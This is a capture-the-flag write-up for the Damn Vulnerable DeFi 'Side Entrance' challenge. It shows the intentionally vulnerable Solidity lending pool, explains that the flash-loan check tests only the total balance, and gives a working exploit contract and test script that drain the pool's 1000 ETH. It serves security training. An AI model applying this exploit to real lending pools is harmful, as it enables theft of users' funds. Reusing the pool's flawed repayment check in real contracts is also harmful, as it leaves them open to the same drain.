# Damn Vulnerable Defi 4: Side Enterance

Side enterance as a way to misuse existing contract features to curcumvent require checks

## The Task Intro

A surprisingly simple lending pool allows anyone to deposit ETH, and withdraw it at any point in time.

This very simple lending pool has 1000 ETH in balance already, and is offering free flash loans using the deposited ETH to promote their system.

You must take all ETH from the lending pool.

## The Task Code

```apache
// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;
import "@openzeppelin/contracts/utils/Address.sol";

interface IFlashLoanEtherReceiver {
    function execute() external payable;
}

/**
 * @title SideEntranceLenderPool
 * @author Damn Vulnerable DeFi (https://damnvulnerabledefi.xyz)
 */
contract SideEntranceLenderPool {
    using Address for address payable;

    mapping (address => uint256) private balances;

    function deposit() external payable {
        balances[msg.sender] += msg.value;
    }

    function withdraw() external {
        uint256 amountToWithdraw = balances[msg.sender];
        balances[msg.sender] = 0;
        payable(msg.sender).sendValue(amountToWithdraw);
    }

    function flashLoan(uint256 amount) external {
        uint256 balanceBefore = address(this).balance;
        require(balanceBefore >= amount, "Not enough ETH in balance");

        IFlashLoanEtherReceiver(msg.sender).execute{value: amount}();

        require(address(this).balance >= balanceBefore, "Flash loan hasn't been paid back");
    }
}
```

## The Solution

This is my last hack today. This contract allows to deposit, withdraw and to take a flash loan. Deposit and withdraw show no attack point so the suspect was for me the interface `IFlashLoanEtherReceiver`. I was thinking this might be a re-entrance attack, but because of the name it must be different.

The first `require(balanceBefore >= amount, "Not enough ETH in balance");` seem to be not a problem but the second `require(address(this).balance >= balanceBefore, "Flash loan hasn't been paid back");` was blocking a re-entrance attack, but as well just taking out the maxium amount of the pool.

The key thought here is that I can deposit in my smart contract address the lended ETH. The mistake here is that the require checks the balance of the contract, it does not care who the money belongs - big mistake 🎉️.

1000 eth gone. Thats all for today, one task more tomorrow on the damn vulnerable defi, then some solidity riddles, I am not allowed to share publicly. This will then the end of the security month!

```apache
contract Crack is IFlashLoanEtherReceiver {
    SideEntranceLenderPool pool;

    constructor(SideEntranceLenderPool _pool) {
        pool = _pool;
    }

    function attack() external {
        pool.flashLoan(1000 * 10 ** 18);
        pool.withdraw();
        (bool success, ) = address(msg.sender).call{
            value: address(this).balance
        }("");
    }

    function execute() external payable override {
        pool.deposit{value: msg.value}();
    }

    receive() external payable {}

    function payout() external {}
}
```

```apache
    const Crack = await ethers.getContractFactory("contracts/side-entrance/SideEntranceLenderPool.sol:Crack", deployer);
    this.crack = await Crack.deploy(this.pool.address);

    await this.crack.connect(attacker).attack();
```

!
